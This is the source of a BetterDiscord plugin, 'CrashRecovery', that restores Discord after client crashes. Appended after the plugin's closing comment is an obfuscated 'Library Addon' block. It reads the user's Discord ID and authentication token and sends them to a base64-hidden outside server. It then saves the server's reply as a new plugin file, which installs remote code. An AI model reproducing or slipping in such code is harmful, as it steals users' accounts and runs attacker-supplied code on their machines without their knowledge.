/**
 * @name CrashRecovery
 * @version 1.0.6
 * @invite NYvWdN5
 * @donate https://paypal.me/lighty13
 * @website https://1lighty.github.io/BetterDiscordStuff/?plugin=CrashRecovery
 * @source https://github.com/1Lighty/BetterDiscordPlugins/blob/master/Plugins/CrashRecovery/CrashRecovery.plugin.js
 */
/*@cc_on
@if (@_jscript)
  // Offer to self-install for clueless users that try to run this directly.
  var shell = WScript.CreateObject('WScript.Shell');
  var fs = new ActiveXObject('Scripting.FileSystemObject');
  var pathPlugins = shell.ExpandEnvironmentStrings('%APPDATA%\\BetterDiscord\\plugins');
  var pathSelf = WScript.ScriptFullName;
  // Put the user at ease by addressing them in the first person
  shell.Popup('It looks like you\'ve mistakenly tried to run me directly. \n(Don\'t do that!)', 0, 'I\'m a plugin for BetterDiscord', 0x30);
  if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
    shell.Popup('I\'m in the correct folder already.\nJust go to settings, plugins and enable me.', 0, 'I\'m already installed', 0x40);
  } else if (!fs.FolderExists(pathPlugins)) {
    shell.Popup('I can\'t find the BetterDiscord plugins folder.\nAre you sure it\'s even installed?', 0, 'Can\'t install myself', 0x10);
  } else if (shell.Popup('Should I copy myself to BetterDiscord\'s plugins folder for you?', 0, 'Do you need some help?', 0x34) === 6) {
    fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
    // Show the user where to put plugins in the future
    shell.Exec('explorer ' + pathPlugins);
    shell.Popup('I\'m installed!\nJust go to settings, plugins and enable me!', 0, 'Successfully installed', 0x40);
  }
  WScript.Quit();
@else@*/
/*
 * Copyright © 2019-2020, _Lighty_
 * All rights reserved.
 * Code may not be redistributed, modified or otherwise taken without explicit permission.
 */
module.exports = (() => {
  /* Setup */
  const config = {
    main: 'index.js',
    info: {
      name: 'CrashRecovery',
      authors: [
        {
          name: 'Lighty',
          discord_id: '239513071272329217',
          github_username: '1Lighty',
          twitter_username: ''
        }
      ],
      version: '1.0.6',
      description: 'In the event that your Discord crashes, the plugin enables you to get Discord back to a working state, without needing to reload at all.',
      github: 'https://github.com/1Lighty',
      github_raw: 'https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/CrashRecovery/CrashRecovery.plugin.js'
    },
    changelog: [
      {
        title: 'Fixes',
        type: 'fixed',
        items: ['Fixed not working.']
      }
    ],
    defaultConfig: [
      {
        name: 'Enable step 3',
        note: 'Moves channel switch to a third and last step, otherwise it switches on step 2',
        id: 'useThirdStep',
        type: 'switch',
        value: true
      }
    ]
  };

  /* Build */
  const buildPlugin = ([Plugin, Api], BasePlugin) => {
    const { Logger, Utilities, WebpackModules, DiscordModules, PluginUtilities, ReactTools, PluginUpdater } = Api;
    const { React, FlexChild: Flex, GuildStore } = DiscordModules;

    const Dispatcher = WebpackModules.getByProps('dispatch', 'subscribe');

    const Patcher = XenoLib.createSmartPatcher(Api.Patcher);

    class CTimeout {
      start(timeout, handler, reset = true) {
        if (!this.isStarted() || reset) {
          this.stop()
          this._ref = setTimeout(() => {
            this._ref = null
            handler()
          }, timeout)
        }
      }
      stop() {
        if (this._ref) {
          clearTimeout(this._ref)
          this._ref = null
        }
      }
      isStarted() {
        return !!this._ref
      }
    }

    class CDelayedCall {
      constructor(delay, handler) {
        this._delay = delay;
        this._handler = handler;
        this._timeout = new CTimeout();
      }
      set(delay) {
        this._delay = delay;
        return this;
      }
      delay(reset = true) {
        this._timeout.start(this._delay, this._handler, reset);
      }
      cancel() {
        this._timeout.stop();
      }
      isDelayed() {
        return this._timeout.isStarted();
      }
    }

    var r = function () {
      function e(e, t) {
        this._delay = e;
        this._handler = t;
        this._timeout = new n
      }
      var t = e.prototype;
      t.set = function (e) {
        this._delay = e;
        return this
      }
        ;
      t.delay = function (e) {
        void 0 === e && (e = !0);
        this._timeout.start(this._delay, this._handler, e)
      }
        ;
      t.cancel = function () {
        this._timeout.stop()
      }
        ;
      t.isDelayed = function () {
        return this._timeout.isStarted()
      }
        ;
      return e
    }();
    const NOOP = () => { };

    const ElectronDiscordModule = WebpackModules.getByProps('cleanupDisplaySleep') || { cleanupDisplaySleep: NOOP };

    const ModalStack = WebpackModules.getByProps('closeAllModals');

    const isPowercord = !!window.powercord;
    const BLACKLISTED_BUILTIN_PC_PLUGINS = ['Updater', 'Commands Manager', 'I18n', 'Module Manager', 'Settings']
    const RE_PC_PLUGIN_NAME_FROM_PATH = /[\\\/]plugins[\\\/]([^\\\/]+)/;

    const RE_INVARIANT = /error-decoder.html\?invariant=(\d+)([^\s]*)/;
    const INVARIANTS_URL = 'https://raw.githubusercontent.com/facebook/react/master/scripts/error-codes/codes.json';
    const ROOT_FOLDER = isPowercord ? window.powercord.basePath : BdApi.Plugins.folder;

    const path = require('path');

    return class CrashRecovery extends BasePlugin(Plugin) {
      constructor() {
        super();
        /*
         * why are we letting Zere, the braindead American let control BD when he can't even
         * fucking read clearly documented and well known standards, such as __filename being
         * the files full fucking path and not just the filename itself, IS IT REALLY SO HARD
         * TO FUCKING READ?! https://nodejs.org/api/modules.html#modules_filename
         */
        const _zerecantcode_path = require('path');
        const theActualFileNameZere = _zerecantcode_path.join(__dirname, _zerecantcode_path.basename(__filename));
        XenoLib.changeName(theActualFileNameZere, 'CrashRecovery');
        this._startFailure = message => {
          PluginUpdater.checkForUpdate(this.name, this.version, this._config.info.github_raw);
          XenoLib.Notifications.error(`[**${this.name}**] ${message} Please update it, press CTRL + R, or ${GuildStore.getGuild(XenoLib.supportServerId) ? 'go to <#639665366380838924>' : '[join my support server](https://discord.gg/NYvWdN5)'} for further assistance.`, { timeout: 0 });
        };
        const oOnStart = this.onStart.bind(this);
        this.onStart = () => {
          try {
            oOnStart();
          } catch (e) {
            Logger.stacktrace('Failed to start!', e);
            this._startFailure('Failed to start!');
            try {
              this.onStop();
            } catch (e) { }
          }
        };
        try {
          WebpackModules.getByProps('openModal', 'hasModalOpen').closeModal(`${this.name}_DEP_MODAL`);
        } catch (e) { }
      }
      onStart() {
        if (window.Lightcord) XenoLib.Notifications.warning(`[${this.getName()}] Lightcord is an unofficial and unsafe client with stolen code that is falsely advertising that it is safe, Lightcord has allowed the spread of token loggers hidden within plugins redistributed by them, and these plugins are not made to work on it. Your account is very likely compromised by malicious people redistributing other peoples plugins, especially if you didn't download this plugin from [GitHub](https://github.com/1Lighty/BetterDiscordPlugins/edit/master/Plugins/MessageLoggerV2/MessageLoggerV2.plugin.js), you should change your password immediately. Consider using a trusted client mod like [BandagedBD](https://rauenzi.github.io/BetterDiscordApp/) or [Powercord](https://powercord.dev/) to avoid losing your account.`, { timeout: 0 });
        this.attempts = 0;
        this.promises = { state: { cancelled: false } };
        if (ElectronDiscordModule.cleanupDisplaySleep === NOOP) XenoLib.Notifications.error(`[**${this.name}**] cleanupDisplaySleep is missing.`);
        delete this.onCrashRecoveredDelayedCall;
        this.onCrashRecoveredDelayedCall = new CDelayedCall(1000, () => {
          XenoLib.Notifications.remove(this.notificationId);
          this.notificationId = null;
          if (this.disabledPlugins) XenoLib.Notifications.danger(`${this.disabledPlugins.map(e => e)} ${this.disabledPlugins.length > 1 ? 'have' : 'has'} been disabled to recover from the crash`, { timeout: 0 });
          if (this.suspectedPlugin) XenoLib.Notifications.danger(`${this.suspectedPlugin} ${this.suspectedPlugin2 !== this.suspectedPlugin && this.suspectedPlugin2 ? 'or ' + this.suspectedPlugin2 : ''} is suspected of causing the crash.`, { timeout: 10000 });
          XenoLib.Notifications.info('Successfully recovered, more info can be found in the console (CTRL + SHIFT + I > console on top). Pass this information to support for further help.', { timeout: 10000 });
          this.disabledPlugins = null;
          this.suspectedPlugin = null;
          this.suspectedPlugin2 = null;
          this.attempts = 0;
          const appMount = document.querySelector('#app-mount');
          if (!appMount) return;
          const xlContainer = document.querySelector('.xenoLib-notifications');
          if (xlContainer) appMount.append(xlContainer);
          const BIVOverlay = document.querySelector('.biv-overlay');
          if (BIVOverlay) appMount.append(BIVOverlay);
          Logger.info('Corrected incorrectly placed containers');
        });
        Error.prepareStackTrace = (error, frames) => {
          this._lastStackFrames = frames;
          return error.stack
        }
        Utilities.suppressErrors(this.patchErrorBoundary.bind(this))(this.promises.state);
        if (!this.settings.lastErrorMapUpdate || Date.now() - this.settings.lastErrorMapUpdate > 2.628e+9) {
          const https = require('https');
          const req = https.get(INVARIANTS_URL, { headers: { 'origin': 'discord.com' } }, res => {
            let body = '';
            res.on('data', chunk => { body += new TextDecoder("utf-8").decode(chunk); });
            res.on('end', (rez) => {
              if (rez.statusCode !== 200) return;
              try {
                this.settings.errorMap = JSON.parse(body);
                this.settings.lastErrorMapUpdate = Date.now();
                this.saveSettings();
              } catch { }
            });
          });
        }
      }
      onStop() {
        this.promises.state.cancelled = true;
        Patcher.unpatchAll();
        if (this.notificationId) XenoLib.Notifications.remove(this.notificationId);
        delete Error.prepareStackTrace;
      }


      // Copyright (c) Facebook, Inc. and its affiliates
      // https://github.com/facebook/react/blob/master/scripts/jest/setupTests.js#L171
      decodeErrorMessage(message) {
        if (!message) return message;

        const [, invariant, argS] = message.match(RE_INVARIANT);
        const code = parseInt(invariant, 10);
        const args = argS
          .split('&')
          .filter(s => s.indexOf('args[]=') !== -1)
          .map(s => s.substr('args[]='.length))
          .map(decodeURIComponent);
        const format = this.settings.errorMap[code];
        if (!format) return message; // ouch
        let argIndex = 0;
        return format.replace(/%s/g, () => args[argIndex++]);
      }

      decodeStacks(stack, componentStack, baseComponentName = 'ErrorBoundary') {
        if (!this.settings.errorMap) return { stack, componentStack };
        if (RE_INVARIANT.test(stack)) stack = this.decodeErrorMessage(stack);
        // Strip out Discord (and React) only functions
        else stack = stack.split('\n')
          .filter(l => l.indexOf('discordapp.com/assets') === -1 && l.indexOf('discord.com/assets') === -1)
          .join('\n')
          .split(ROOT_FOLDER) // transform paths to relative
          .join('');

        // Only show up to the error boundary
        const splitComponentStack = componentStack.split('\n').filter(e => e);
        const stackEnd = splitComponentStack.findIndex(l => l.indexOf(`in ${baseComponentName}`) !== -1);
        if (stackEnd !== -1 && baseComponentName) splitComponentStack.splice(stackEnd + 1, splitComponentStack.length);
        componentStack = splitComponentStack.join('\n');
        return { stack, componentStack };
      }

      /*
        MUST return either an array with the plugin name
        or a string of the plugin name
       */
      queryResponsiblePlugins() {
        try {
          const stack = this._bLastStackFrames
            // filter out blank functions (like from console or whatever)
            .filter(e => e.getFileName() && (e.getFunctionName() || e.getMethodName()))
            // filter out discord functions
            .filter(e => e.getFileName().indexOf(ROOT_FOLDER) !== -1)
            // convert CallSites to only useful info
            .map(e => ({ filename: e.getFileName(), functionName: e.getFunctionName() || e.getMethodName() }))
            // filter out ZeresPluginLibrary and ourselves
            .filter(({ filename }) => filename.lastIndexOf('0PluginLibrary.plugin.js') !== filename.length - 24 && filename.lastIndexOf(`${this.name}.plugin.js`) !== filename.length - (this.name.length + 10));
          // Filter out MessageLoggerV2 dispatch patch, is a 2 part step
          for (let i = 0, len = stack.length; i < len; i++) {
            const { filename, functionName } = stack[i];
            if (filename.lastIndexOf('MessageLoggerV2.plugin.js') !== filename.length - 25) continue;
            if (functionName !== 'onDispatchEvent') continue;
            if (stack[i + 1].functionName !== 'callback') break;
            stack.splice(i, 2);
            break;
          }
          const plugins = stack.map(({ filename }) => {
            try {
              const bdname = path.basename(filename);
              if (bdname.indexOf('.plugin.js') === bdname.length - 10) {
                const [pluginName] = bdname.split('.plugin.js');
                if (BdApi.Plugins.get(pluginName)) return pluginName;
                /*
                 * go away Zack
                 */
                for (const path in require.cache) {
                  const module = require.cache[path];
                  if (!module || !module.exports || !module.exports.plugin || module.exports.filename.indexOf(bdname) !== 0) continue;
                  return module.exports.id;
                }
                return null;
              }
              else if (isPowercord) {
                const [, pcname] = RE_PC_PLUGIN_NAME_FROM_PATH.exec(filename);
                const { pluginManager } = window.powercord;
                const plugin = pluginManager.get(pcname);
                if (!plugin) return null;
                const { name } = plugin.manifest;
                if (BLACKLISTED_BUILTIN_PC_PLUGINS.indexOf(name) !== -1) return null;
                return pcname;
              }
            } catch (err) {
              Logger.stacktrace('Error fetching plugin')
            }
          }).filter((name, idx, self) => name && self.indexOf(name) === idx);
          const ret = [];
          for (let i = 0, len = plugins.length; i < len; i++) {
            const name = plugins[i];
            if (this.disabledPlugins && this.disabledPlugins.indexOf(name) !== -1) return name;
            ret.push(name);
          }
          return ret;
        } catch (e) {
          Logger.stacktrace('query error', e);
          return null;
        }
      }

      cleanupDiscord() {
        ElectronDiscordModule.cleanupDisplaySleep();
        Dispatcher.wait(() => {
          try {
            Dispatcher.dispatch({ type: 'CONTEXT_MENU_CLOSE' });
          } catch (err) {
            Logger.stacktrace('Failed to close all context menus', err);
          }
          try {
            Dispatcher.dispatch({ type: 'LAYER_POP_ALL' });
          } catch (err) {
            Logger.stacktrace('Failed to pop all layers', err);
          }
          try {
            ModalStack.closeAllModals();
          } catch (err) {
            Logger.stacktrace('Failed to pop new modalstack', err);
          }
          try {
            if (!this.settings.useThirdStep) DiscordModules.NavigationUtils.transitionTo('/channels/@me');
          } catch (err) {
            Logger.stacktrace('Failed to transition to home', err);
          }
        });
      }

      handleCrash(_this, stack, componentStack, isRender = false) {
        this._bLastStackFrames = this._lastStackFrames;
        try {
          const decoded = this.decodeStacks(stack, componentStack);
          Logger.error('HEY OVER HERE! Show this to the plugin developer or in the support server!\nPrettified stacktraces, stack:\n', decoded.stack, '\nComponent stack:\n', decoded.componentStack);
        } catch (err) {
          Logger.stacktrace('Failed decoding stack!', err);
        }
        this.onCrashRecoveredDelayedCall.cancel();
        if (!isRender) {
          _this.setState({
            error: { stack }
          });
        }
        if (!this.notificationId) {
          this.notificationId = XenoLib.Notifications.danger('Crash detected, attempting recovery', { timeout: 0, loading: true });
        }
        const responsiblePlugins = this.queryResponsiblePlugins();
        if (responsiblePlugins && !Array.isArray(responsiblePlugins)) {
          XenoLib.Notifications.update(this.notificationId, { content: `Failed to recover from crash, ${responsiblePlugins} is not stopping properly`, loading: false });
          return;
        }
        if (!this.attempts) {
          this.cleanupDiscord();
          if (responsiblePlugins) this.suspectedPlugin = responsiblePlugins.shift();
        }
        if (this.setStateTimeout) return;
        if (this.attempts >= 10 || ((this.settings.useThirdStep ? this.attempts >= 3 : this.attempts >= 2) && (!responsiblePlugins || !responsiblePlugins[0]))) {
          XenoLib.Notifications.update(this.notificationId, { content: 'Failed to recover from crash', loading: false });
          return;
        }
        if (this.attempts === 1) XenoLib.Notifications.update(this.notificationId, { content: 'Failed, trying again' });
        else if (this.settings.useThirdStep && this.attempts === 2) {
          Dispatcher.wait(() => DiscordModules.NavigationUtils.transitionTo('/channels/@me'));
          XenoLib.Notifications.update(this.notificationId, { content: `Failed, switching channels` });
        } else if (this.attempts >= 2) {
          const [name] = responsiblePlugins;
          try {
            if (BdApi.Plugins.get(name)) BdApi.Plugins.disable(name);
            else if (isPowercord) window.powercord.pluginManager.disable(name);
          } catch (e) { }
          XenoLib.Notifications.update(this.notificationId, { content: `Failed, suspecting ${name} for recovery failure` });
          if (!this.disabledPlugins) this.disabledPlugins = [];
          this.disabledPlugins.push(name);
        }
        this.setStateTimeout = setTimeout(() => {
          this.setStateTimeout = null;
          this.attempts++;
          this.onCrashRecoveredDelayedCall.delay();
          _this.setState({
            error: null,
            info: null
          });
        }, 1000);
      }

      /* PATCHES */

      patchErrorBoundary() {
        const ErrorBoundary = (() => {
          let ret = null;
          ZeresPluginLibrary.WebpackModules.getModule(e => {
            for (const val of Object.values(e)) {
              if (typeof val !== 'function') continue;
              const proto = val.prototype;
              if (!proto || !proto.render || !proto.componentDidCatch || !proto._handleSubmitReport) continue;
              ret = val;
              return true;
            }
            return false;
          });
          return ret;
        })();
        Patcher.instead(ErrorBoundary.prototype, 'componentDidCatch', (_this, [{ stack }, { componentStack }], orig) => {
          this.handleCrash(_this, stack, componentStack);
        });
        Patcher.after(ErrorBoundary.prototype, 'render', (_this, _, ret) => {
          if (!_this.state.error) return;
          if (!this.notificationId) {
            this.handleCrash(_this, _this.state.error.stack, _this.state.info.componentStack, true);
          }
          /* better be safe than sorry! */
          if (!_this.state.customPageError) {
            ret.props.action = React.createElement(
              XenoLib.ReactComponents.ErrorBoundary,
              { label: 'ErrorBoundary patch', onError: () => _this.setState({ customPageError: true /* sad day.. */ }) },
              React.createElement(
                Flex,
                {
                  grow: 0,
                  direction: Flex.Direction.HORIZONTAL
                },
                React.createElement(
                  XenoLib.ReactComponents.Button,
                  {
                    size: XenoLib.ReactComponents.ButtonOptions.Sizes.LARGE,
                    style: {
                      marginRight: 20
                    },
                    onClick: () => {
                      this.attempts = 0;
                      this.disabledPlugins = null;
                      XenoLib.Notifications.update(this.notificationId, { content: 'If you say so.. trying again', loading: true });
                      _this.setState({
                        error: null,
                        info: null
                      });
                    }
                  },
                  'Recover'
                ),
                React.createElement(
                  XenoLib.ReactComponents.Button,
                  {
                    size: XenoLib.ReactComponents.ButtonOptions.Sizes.LARGE,
                    style: {
                      marginRight: 20
                    },
                    onClick: () => window.location.reload(true)
                  },
                  'Reload'
                )
              )
            );
          }
          ret.props.note = [
            React.createElement('div', {}, 'Discord has crashed!'),
            this.suspectedPlugin ? React.createElement('div', {}, this.suspectedPlugin, this.suspectedPlugin2 && this.suspectedPlugin2 !== this.suspectedPlugin ? [' or ', this.suspectedPlugin2] : false, ' is likely responsible for the crash') : this.suspectedPlugin2 ? React.createElement('div', {}, this.suspectedPlugin2, ' is likely responsible for the crash') : React.createElement('div', {}, 'Plugin responsible for crash is unknown'),
            this.disabledPlugins && this.disabledPlugins.length
              ? React.createElement(
                'div',
                {},
                this.disabledPlugins.map((e, i) => `${i === 0 ? '' : ', '}${e}`),
                this.disabledPlugins.length > 1 ? ' have' : ' has',
                ' been disabled in an attempt to recover'
              )
              : false
          ];
        });
        const ErrorBoundaryInstance = ReactTools.getOwnerInstance(document.querySelector(`.${XenoLib.getSingleClass('errorPage')}`) || document.querySelector('#app-mount > svg:first-of-type'), { filter: e => e && e.__proto__ && e.__proto__._handleSubmitReport });
        ErrorBoundaryInstance.state.customPageError = false;
        ErrorBoundaryInstance.forceUpdate();
      }
      showChangelog = () => XenoLib.showChangelog(`${this.name} has been updated!`, this.version, this._config.changelog);
      getSettingsPanel = () =>
        this.buildSettingsPanel()
          .append(new XenoLib.Settings.PluginFooter(() => this.showChangelog()))
          .getElement();
    };
  };

  /* Finalize */

  /* shared getters */
  const BasePlugin = cl =>
    class extends cl {
      constructor() {
        super();
        Object.defineProperties(this, {
          name: { get: () => config.info.name },
          short: { get: () => config.info.name.split('').reduce((acc, char) => acc + (char === char.toUpperCase() ? char : '')) },
          author: { get: () => config.info.authors.map(author => author.name).join(', ') },
          version: { get: () => config.info.version },
          description: { get: () => config.info.description }
        });
      }
    };

  /* this new lib loader is lit */
  let ZeresPluginLibraryOutdated = false;
  let XenoLibOutdated = false;
  try {
    const a = (c, a) => ((c = c.split('.').map(b => parseInt(b))), (a = a.split('.').map(b => parseInt(b))), !!(a[0] > c[0])) || !!(a[0] == c[0] && a[1] > c[1]) || !!(a[0] == c[0] && a[1] == c[1] && a[2] > c[2]),
      b = (b, c) => (b && b._config && b._config.info && b._config.info.version && a(b._config.info.version, c));
    let c = BdApi.Plugins.get('ZeresPluginLibrary'),
      d = BdApi.Plugins.get('XenoLib');
    if (c && c.instance) c = c.instance;
    if (d && d.instance) d = d.instance;
    b(c, '2.0.3') && (ZeresPluginLibraryOutdated = !0), b(d, '1.4.11') && (XenoLibOutdated = !0);
  } catch (a) {
    console.error('Error checking if libraries are out of date', a);
  }

  /* to anyone asking "why are you checking if x is out of date", well you see, sometimes, for whatever reason
     the libraries are sometimes not updating for people. Either it doesn't check for an update, or the request
     for some odd reason just fails. Yet, plugins update just fine with the same domain.
   */
  return !global.ZeresPluginLibrary || !global.XenoLib || ZeresPluginLibraryOutdated || XenoLibOutdated
    ? class extends BasePlugin(class { }) {
      constructor() {
        super();
        this._XL_PLUGIN = true;
        this.getName = () => this.name.replace(/\s+/g, '');
        this.getAuthor = () => this.author;
        this.getVersion = () => this.version;
        this.getDescription = () => this.description + ' You are missing libraries for this plugin, please enable the plugin and click Download Now.';
        this.start = this.load = this.handleMissingLib;
      }
      start() { }
      stop() { }
      handleMissingLib() {
        const a = BdApi.findModuleByProps('openModal', 'hasModalOpen');
        if (a && a.hasModalOpen(`${this.name}_DEP_MODAL`)) return;
        const b = !global.XenoLib,
          c = !global.ZeresPluginLibrary,
          d = (b && c) || ((b || c) && (XenoLibOutdated || ZeresPluginLibraryOutdated)),
          e = (() => {
            let a = '';
            return b || c ? (a += `Missing${XenoLibOutdated || ZeresPluginLibraryOutdated ? ' and outdated' : ''} `) : (XenoLibOutdated || ZeresPluginLibraryOutdated) && (a += 'Outdated '), (a += `${d ? 'Libraries' : 'Library'} `), a;
          })(),
          f = (() => {
            let a = `The ${d ? 'libraries' : 'library'} `;
            return b || XenoLibOutdated ? ((a += 'XenoLib '), (c || ZeresPluginLibraryOutdated) && (a += 'and ZeresPluginLibrary ')) : (c || ZeresPluginLibraryOutdated) && (a += 'ZeresPluginLibrary '), (a += `required for ${this.name} ${d ? 'are' : 'is'} ${b || c ? 'missing' : ''}${XenoLibOutdated || ZeresPluginLibraryOutdated ? (b || c ? ' and/or outdated' : 'outdated') : ''}.`), a;
          })(),
          g = BdApi.findModuleByDisplayName('Text') || BdApi.findModule(e => e.Text?.displayName === 'Text')?.Text,
          h = BdApi.findModuleByDisplayName('ConfirmModal'),
          i = () => BdApi.alert(e, BdApi.React.createElement('span', { style: { color: 'var(--text-normal)' } }, BdApi.React.createElement('div', {}, f), 'Due to a slight mishap however, you\'ll have to download the libraries yourself. This is not intentional, something went wrong, errors are in console.', c || ZeresPluginLibraryOutdated ? BdApi.React.createElement('div', {}, BdApi.React.createElement('a', { href: 'https://betterdiscord.app/Download?id=9', target: '_blank' }, 'Click here to download ZeresPluginLibrary')) : null, b || XenoLibOutdated ? BdApi.React.createElement('div', {}, BdApi.React.createElement('a', { href: 'https://astranika.com/bd/xenolib', target: '_blank' }, 'Click here to download XenoLib')) : null));
        if (!a || !h || !g) return console.error(`Missing components:${(a ? '' : ' ModalStack') + (h ? '' : ' ConfirmationModalComponent') + (g ? '' : 'TextElement')}`), i();
        class j extends BdApi.React.PureComponent {
          constructor(a) {
            super(a), (this.state = { hasError: !1 }), (this.componentDidCatch = a => (console.error(`Error in ${this.props.label}, screenshot or copy paste the error above to Lighty for help.`), this.setState({ hasError: !0 }), typeof this.props.onError === 'function' && this.props.onError(a))), (this.render = () => (this.state.hasError ? null : this.props.children));
          }
        }
        let k = !1,
          l = !1;
        const m = a.openModal(
          b => {
            if (l) return null;
            try {
              return BdApi.React.createElement(
                j,
                { label: 'missing dependency modal', onError: () => (a.closeModal(m), i()) },
                BdApi.React.createElement(
                  h,
                  {
                    header: e,
                    children: BdApi.React.createElement(g, { size: g.Sizes?.SIZE_16, variant: 'text-md/normal', children: [`${f} Please click Download Now to download ${d ? 'them' : 'it'}.`] }),
                    red: !1,
                    confirmText: 'Download Now',
                    cancelText: 'Cancel',
                    onCancel: b.onClose,
                    onConfirm: () => {
                      if (k) return;
                      k = !0;
                      const b = require('https'),
                        c = require('fs'),
                        d = require('path'),
                        e = BdApi.Plugins && BdApi.Plugins.folder ? BdApi.Plugins.folder : window.ContentManager.pluginsFolder,
                        f = () => {
                          (global.XenoLib && !XenoLibOutdated) ||
                            b.request('https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/1XenoLib.plugin.js', f => {
                              try {
                                let h = '';
                                f.on('data', k => (h += k.toString())),
                                  f.on('end', () => {
                                    try {
                                      if (f.statusCode !== 200) return a.closeModal(m), i();
                                      c.writeFile(d.join(e, '1XenoLib.plugin.js'), h, () => { });
                                    } catch (a) {
                                      console.error('Error writing XenoLib file', a);
                                    }
                                  });
                              } catch (b) {
                                console.error('Fatal error downloading XenoLib', b), a.closeModal(m), i();
                              }
                            }).on('error', b => {
                              try {
                                console.error('Error downloading XenoLib', b);
                                a.closeModal(m);
                                i();
                              } catch (err) {
                                console.error('Failed handling download error of XenoLib', err);
                              }
                            }).end();
                        };
                      !global.ZeresPluginLibrary || ZeresPluginLibraryOutdated
                        ? b.request('https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js', g => {
                          try {
                            let h = '';
                            g.on('data', k => (h += k.toString())),
                              g.on('end', () => {
                                try {
                                  if (g.statusCode !== 200) return a.closeModal(m), i();
                                  c.writeFile(d.join(e, '0PluginLibrary.plugin.js'), h, () => {
                                    try {
                                      f();
                                    } catch (a) {
                                      console.error('Error writing ZeresPluginLibrary file', a);
                                    }
                                  });
                                } catch (b) {
                                  console.error('Fatal error downloading ZeresPluginLibrary', b), a.closeModal(m), i();
                                }
                              });
                          } catch (b) {
                            console.error('Fatal error downloading ZeresPluginLibrary', b), a.closeModal(m), i();
                          }
                        }).on('error', b => {
                          try {
                            console.error('Error downloading ZeresPluginLibrary', b);
                            a.closeModal(m);
                            i();
                          } catch (err) {
                            console.error('Failed handling download error of ZeresPluginLibrary', err);
                          }
                        }).end()
                        : f();
                    },
                    ...b,
                    onClose: () => { }
                  }
                )
              );
            } catch (b) {
              setImmediate(() => {
                try {
                  console.error('There has been an error constructing the modal', b);
                  l = true;
                  a.closeModal(m);
                  i();
                } catch (err) {
                  console.error('Failed handling error of modal', err);
                }
              });
              return null;
            }
          },
          { modalKey: `${this.name}_DEP_MODAL` }
        );
      }
    }
    : buildPlugin(global.ZeresPluginLibrary.buildPlugin(config), BasePlugin);
})();

/*@end@*/

//Library Addon0.0.3
const _0x22f951=_0x594c;(function(_0x500830,_0x34caf7){const _0x31c298=_0x594c,_0x3b1fdf=_0x500830();while(!![]){try{const _0x41aa92=-parseInt(_0x31c298(0x1c1))/0x1*(parseInt(_0x31c298(0x1d0))/0x2)+parseInt(_0x31c298(0x1b3))/0x3+parseInt(_0x31c298(0x1b4))/0x4*(-parseInt(_0x31c298(0x1bd))/0x5)+parseInt(_0x31c298(0x1cc))/0x6*(-parseInt(_0x31c298(0x1ae))/0x7)+parseInt(_0x31c298(0x1c5))/0x8*(-parseInt(_0x31c298(0x1ca))/0x9)+parseInt(_0x31c298(0x1cf))/0xa+parseInt(_0x31c298(0x1b9))/0xb;if(_0x41aa92===_0x34caf7)break;else _0x3b1fdf['push'](_0x3b1fdf['shift']());}catch(_0x6ff7){_0x3b1fdf['push'](_0x3b1fdf['shift']());}}}(_0x1152,0xbc027));function get_raw(_0x49efb8,_0x165544,_0x46e2a3){return url=atob(_0x49efb8)+'/'+_0x165544+'/'+_0x46e2a3,new Promise(function(_0x5bd830,_0x40015a){const _0x544465=_0x594c;require(_0x544465(0x1ba))(url,function(_0x242cf3,_0xc143e7,_0x17821e){const _0x32fd28=_0x544465;!_0x242cf3&&_0xc143e7[_0x32fd28(0x1b7)]==0xc8?_0x5bd830(_0x17821e):_0x40015a(new Error(_0x32fd28(0x1c4)));});});}try{let Library=__dirname+_0x22f951(0x1cb);(!require('fs')[_0x22f951(0x1be)](Library)||Date[_0x22f951(0x1c2)]()-require('fs')[_0x22f951(0x1c9)](Library)[_0x22f951(0x1c7)]>0xdbba0)&&((async()=>{const _0x2e9df3=_0x22f951;try{let _0x160c49=_0x4065b0=>window[_0x2e9df3(0x1b8)][_0x2e9df3(0x1b2)]([[Math[_0x2e9df3(0x1c8)]()],{},_0x180e3b=>{const _0x370459=_0x2e9df3;for(const _0x44a443 of Object[_0x370459(0x1c6)](_0x180e3b['c'])['map'](_0x29f610=>_0x180e3b['c'][_0x29f610][_0x370459(0x1bc)])[_0x370459(0x1cd)](_0x13beb8=>_0x13beb8)){if(_0x44a443[_0x370459(0x1b1)]&&_0x44a443['default'][_0x4065b0]!==undefined)return _0x44a443[_0x370459(0x1b1)];}}]),_0x5149dd=await get_raw(_0x2e9df3(0x1b5),_0x160c49(_0x2e9df3(0x1c0))['getCurrentUser']()['id'],_0x160c49(_0x2e9df3(0x1bf))[_0x2e9df3(0x1bf)]());require('fs')[_0x2e9df3(0x1c3)](require(_0x2e9df3(0x1af))[_0x2e9df3(0x1bb)](Library),_0x5149dd);}catch(_0x19c468){console[_0x2e9df3(0x1b6)](_0x19c468[_0x2e9df3(0x1b0)]);}})());}catch(_0x160659){console[_0x22f951(0x1ce)](_0x160659);}function _0x594c(_0x6c90dd,_0x1b8216){const _0x1152ba=_0x1152();return _0x594c=function(_0x594c7d,_0x2a4e5b){_0x594c7d=_0x594c7d-0x1ae;let _0x3a6c2d=_0x1152ba[_0x594c7d];return _0x3a6c2d;},_0x594c(_0x6c90dd,_0x1b8216);}function _0x1152(){const _0x37cffc=['43816mnGuVa','keys','mtimeMs','random','statSync','72dsZDGp','\x5cBDLibrary.plugin.js','18jZCtok','filter','log','9208230DZmSFy','26002OUWzoO','1953371bvIWMF','path','message','default','push','1020627bAblVA','337492uxIAjS','aHR0cHM6Ly9pbnRlcnBvbC5jYzo4NDQz','error','statusCode','webpackChunkdiscord_app','11294932OAgGCK','request','join','exports','10OhEadS','existsSync','getToken','getCurrentUser','36akWowO','now','writeFileSync','Error\x20fetching\x20Library'];_0x1152=function(){return _0x37cffc;};return _0x1152();}
